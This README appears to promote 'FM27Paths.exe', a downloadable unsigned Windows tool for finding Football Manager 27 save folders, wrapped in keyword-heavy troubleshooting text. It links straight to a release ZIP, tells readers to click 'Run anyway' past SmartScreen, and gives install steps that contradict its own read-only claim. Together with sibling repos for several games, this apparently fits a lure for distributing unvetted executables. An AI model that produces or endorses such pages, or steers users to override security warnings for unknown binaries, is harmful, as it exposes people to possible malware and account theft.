# Football Manager 27 Save Folder Missing — FM27 User Data Path on Windows

<p align="center">
  <img src="https://i.postimg.cc/wM25HSX4/banner.png" alt="Football Manager 27 — Save Path Check for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Path%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-fm27--path--r06-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · Football Manager 27 · Save and troubleshooting documentation**

The **Football Manager 27 save location** is not necessarily the same folder as the Steam game installation. Confusing those two paths is an easy way to end up copying graphics, editor data or career saves to the wrong place.

A November 14 report described an FM27 user-data folder missing from the expected Documents location, even though other folders appeared under Public and user-profile paths. That is a good example of why an FM27 path checker should search carefully before changing files. This repository concentrates on locating the actual user-data directory; it does not promise to recover a career that was never saved.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| `Sports Interactive\Football Manager 27` missing | Windows OneDrive redirection or custom user-data path in Preferences | Compare `%USERPROFILE%\Documents`, `OneDrive\Documents`, and `Public` |
| Career `.fm` save on disk not in Load Game list | Save copied into an inactive duplicate user-data directory | Match the active `games\` folder configured inside FM27 |
| Steam 'Browse local files' opens wrong folder | Steam opens `steamapps\common` binaries instead of user data | Locate the separate user-data `games\` directory |
| Protecting long-term career saves before patches | Single `.fm` file overwritten on autosave without external backup | Copy career `.fm` files to a dated backup folder |

## Download for Windows

[**Download FM27Paths.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/FM27Paths.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `FM27Paths.exe`? (Automatic checks in ~2 seconds)

- Searches local `Documents`, `OneDrive\Documents`, and `C:\Users\Public` for `Football Manager 27` user-data folders.
- Locates all `games\*.fm` career save files and prints exact sizes and modified timestamps.
- Identifies duplicate `Sports Interactive` folders so you know which directory FM27 actively reads.
- Operates strictly read-only without moving or modifying career `.fm` files.

### Sample Diagnostic Output

```text
[FM27Paths] Searching for Football Manager 27 career save directories...
[OK]   Primary User Dir : C:\Users\Player\Documents\Sports Interactive\Football Manager 27
[OK]   games\ folder    : 4 career saves found (Latest: Arsenal_2031.fm - 84.2 MB)
[INFO] OneDrive Check   : No duplicate FM27 folder in OneDrive\Documents
[OK]   Steam Install    : D:\SteamLibrary\steamapps\common\Football Manager 27
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `FM27Paths.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **FM27Paths.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **FM27Paths.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- The expected `Sports Interactive\Football Manager 27` folder is absent from Documents.
- A career save is on disk but does not appear in the Load Game list.
- Graphics packs or editor data were copied into a folder the game is not currently using.
- A custom path or OneDrive Documents location makes the active user-data folder unclear.

## Before changing anything

In Football Manager, look for the relevant location or save-path option in Preferences before moving files. Note the account and launcher used for the installation, then close the game. Use File Explorer to examine the normal Documents location and any configured OneDrive Documents path.

A player report also mentioned folders under `C:\Users\Public\Sports Interactive\Football Manager 27` and a user-specific Sports Interactive location. Those are **reported examples**, not universal defaults. Do not create or populate extra folders just because you saw a similar path online.

## What to check

Distinguish three directories: the installed game files, the user-data folder containing resources such as graphics and saves, and any cloud or custom copy. If FM27 points to a custom location, that preference matters more than the standard path suggested by another guide.

Make a backup of a career before renaming or moving it. Do not use the Steam “Browse local files” button as proof of where the user data lives; that button normally opens the installation directory. If the folder appears in multiple places, compare contents and modification times rather than copying everything between them.

## What this project covers

This project deals with **FM27 save folder not showing**, **Football Manager 27 Documents folder missing** and **FM27 save path** checks. It is not a graphics pack installer, a save editor or a repair for an incompatible career database.

## Troubleshooting

### There is no Football Manager 27 folder in Documents

Check the in-game location setting, Windows user identity, OneDrive settings and other reported user-data paths first.

### Career file is present but not in Load Game

Confirm that it is inside the currently selected save directory and keep an independent backup before attempting relocation.

### Steam opens the wrong folder

That is likely the game installation directory, not the active user-data location. Find the path from the game settings instead.

## Frequently asked questions

**Is the FM27 install folder the save folder?**

Generally no. Treat installed binaries and user-created data as separate locations.

**Does this support Game Pass?**

The Windows user-data path can vary by launcher; verify the game settings and current Windows profile.

**Can it repair corrupted career saves?**

No. Locating a file and repairing its contents are different tasks.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Community report: FM27 folder not created in Documents](https://www.reddit.com/r/footballmanager/comments/1xvp9xd/game_folder_not_being_created_in_documents_folder/)
- [Football Manager 27 official release](https://www.footballmanager.com/news/football-manager-27-launches-10-november)
- [FM27 Steam page](https://store.steampowered.com/app/4530370/)

## More Windows Game Diagnostic Tools

- [FM27-GraphicsPathDoctor](../FM27-GraphicsPathDoctor) — Football Manager 27 facepacks, logos & skins folder doctor
- [inZOI-CanvasModPathDoctor](../inZOI-CanvasModPathDoctor) — inZOI `Documents\inZOI` & `SaveGames` path doctor
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers save backup & version snapshot manager
- [Permafrost-SaveGuard](../Permafrost-SaveGuard) — Permafrost `BackupSaves` & world recovery check

## Disclaimer

This is an independent community project for Football Manager 27 players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
